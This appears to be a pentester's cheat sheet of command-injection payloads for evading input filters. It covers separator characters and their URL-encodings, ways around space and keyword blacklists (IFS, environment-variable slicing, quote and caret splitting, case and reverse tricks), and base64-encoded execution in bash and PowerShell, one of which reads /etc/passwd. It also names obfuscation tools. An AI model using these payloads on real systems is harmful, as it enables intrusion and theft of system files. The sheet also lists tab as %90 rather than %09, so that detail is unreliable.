* Command injection characters: `;,\n,&,|,&&,||,``,$()`. URL-encoded: `%3b,%0a,%26,%7c,%26%26,%7c%7c,%60%60,%24%28%29`
* Space character (`%20`) blacklist bypass: tab character `%90`, IFS variable (linux) `${IFS}`, brace expansion (linux) `{ls,-la}`
	* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
* Character blacklist bypass using environment variables:
	* Linux: `${PATH:0:1}` is `/`, `${LS_COLORS:10:1}` is `;`. Use `printenv` and check what other variables can be substituted.
	* Windows: 
		* cmd: `%HOMEPATH:~6,-11%` is `\`
		* Powershell: `$env:HOMEPATH[0]` is `\`
		* Print env variables and check other other options.
* Character blacklist bypass using character shifting: `$(tr '!-}' '"-~'<<<[)` shifts `[` (ascii 91) to `\` (ascii 92).
* Bypass command blacklist: 
	* Bash and Powershell: 
		* `w'h'o'am'i`, `w"h"o"am"i`. The `',""` characters need to even and cannot mix characters.
	* Linux only: 
		* `who$@ami`, `w\ho\am\i`
		* Case manipulation: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` or `$(a="WhOaMi";printf %s "${a,,}")`
		* Reverse manipulation: `$(rev<<<'imaohw')`
		* Encoding manipulation: `echo -n '<command>' | base64` and then execute `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw)`
	* Windows only: 
		* `who^ami`
		* Case manipulation: `WhOaMi`
		* Reverse manipulation: `"whoami"[-1..-20] -join ''` and then execute `iex "$('imaohw'[-1..-20] -join '')"`
		* Encoding manipulation: `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` and then execute `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` (Note: This is base64 is utf-16LE)
* Here is a command to determine if the shell used is cmd or powershell: `(dir 2>&1 *\|echo CMD);&<# rem #>echo PowerShell`
* More command injection payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
* Evasion tools:
	* [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
		* `./bashfuscator -c '<command>'`
		* `./bashfuscator -c '<command>' -s 1 -t 1 --no-mangling --layers 1`
	* [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
		* `Invoke-DOSfuscation`